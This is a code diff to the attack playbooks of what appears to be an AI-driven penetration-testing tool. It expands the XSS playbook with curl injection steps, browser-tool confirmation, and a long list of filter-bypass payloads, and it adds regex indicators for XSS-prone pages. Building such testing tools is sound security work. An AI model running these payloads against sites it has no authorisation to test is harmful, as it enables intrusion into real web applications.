@@ -38,13 +38,72 @@ export const PLAYBOOKS: Record<string, string> = {
 - Check indirect IDOR: change ID in one endpoint, observe result in another`,
 
   xss: `## XSS Playbook
-- Test reflected: <script>alert(1)</script> in all params
-- Try event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>
-- Try encoding bypasses: URL encoding, double encoding, HTML entities
-- For stored XSS: inject in forms that save data, check where it renders
-- DOM XSS: check for document.location, innerHTML, eval in client JS
-- Use browser tool to confirm — check dialogs array for alert/confirm/prompt
-- If angle brackets filtered: " onfocus=alert(1) autofocus="`,
+
+### Step 1: Identify Injection Points
+- Use curl to fetch every page with forms or URL parameters
+- Look for reflected output: inject a unique canary string (e.g. "pwnkit123xss") and check if it appears unescaped in the response HTML
+- Check Content-Type headers — XSS only works when response is text/html
+- Note which characters are reflected vs stripped: < > " ' / \` ( ) = on
+
+### Step 2: Test with Basic Payloads via curl
+- Reflected: <script>alert(1)</script> in all params (GET and POST)
+- Event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>
+- Stored XSS: inject in forms that save data (comments, profiles, settings), then visit the page where it renders
+- DOM XSS: look for document.location, innerHTML, eval, document.write in client JS source
+
+### Step 3: Confirm XSS with the Browser Tool (CRITICAL)
+curl CANNOT execute JavaScript — you MUST use the browser tool to confirm XSS fires.
+1. browser action=navigate url=TARGET_URL_WITH_PAYLOAD
+2. Check the "dialogs" array in the response — if it contains "alert: 1" or similar, XSS is CONFIRMED
+3. If no dialog fires, try: browser action=evaluate script="document.querySelector('img[onerror]') !== null"
+4. For stored XSS: first inject via curl/submit_form, then navigate with browser to the render page
+5. For DOM XSS: browser action=navigate to the page, then action=evaluate to check if payload executed
+
+### Step 4: WAF/Filter Bypass Payloads
+If basic payloads are blocked, try these bypasses IN ORDER:
+
+**Angle brackets stripped/encoded:**
+- " onfocus=alert(1) autofocus="
+- ' onfocus='alert(1)' autofocus='
+- " autofocus onfocus=alert(1)//
+
+**script tag blocked:**
+- <img src=x onerror=alert(1)>
+- <svg/onload=alert(1)>
+- <details open ontoggle=alert(1)>
+- <body onload=alert(1)>
+- <marquee onstart=alert(1)>
+- <video><source onerror=alert(1)>
+- <input onfocus=alert(1) autofocus>
+
+**alert() blocked:**
+- <img src=x onerror=confirm(1)>
+- <img src=x onerror=prompt(1)>
+- <img src=x onerror=print()>
+- <img src=x onerror=window['al'+'ert'](1)>
+
+**Encoding bypasses:**
+- URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
+- Double URL encoding: %253Cscript%253Ealert(1)%253C%252Fscript%253E
+- HTML entities: &lt;script&gt; (check if decoded server-side)
+- Unicode: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
+- Mixed case: <ScRiPt>alert(1)</ScRiPt>
+- Null bytes: <scr%00ipt>alert(1)</script>
+
+**Attribute context escapes:**
+- " onmouseover=alert(1) x="
+- '-alert(1)-'
+- javascript:alert(1) (in href/src attributes)
+- data:text/html,<script>alert(1)</script> (in iframe src)
+
+**Template/framework specific:**
+- {{constructor.constructor('alert(1)')()}} (AngularJS sandbox escape)
+- \${alert(1)} (template literals)
+
+### Step 5: Confirm and Save
+- Every XSS MUST be confirmed via the browser tool dialogs array before saving
+- Use save_finding with the exact payload, the URL, the parameter name, and the dialog output as evidence
+- Include both the curl request that injects AND the browser confirmation`,
 
   ssrf: `## SSRF Playbook
 - Test URL/webhook/callback inputs with: http://127.0.0.1, http://localhost
@@ -147,8 +206,20 @@ const INDICATORS: VulnIndicator[] = [
       /javascript:/i,
       /document\.cookie/i,
       /innerHTML/i,
+      /document\.write/i,
       /reflected.*input/i,
       /Content-Type:.*text\/html/i,
+      /<form[\s>]/i,
+      /<input[\s>]/i,
+      /<textarea[\s>]/i,
+      /type=["']?text["']?/i,
+      /name=["']?(search|query|q|comment|message|name|title|body|content|text|url|redirect|callback|return)/i,
+      /\?[^=]+=.*</i,
+      /xss/i,
+      /cross.site/i,
+      /sanitiz/i,
+      /escape/i,
+      /\.php\?/i,
     ],
   },
   {
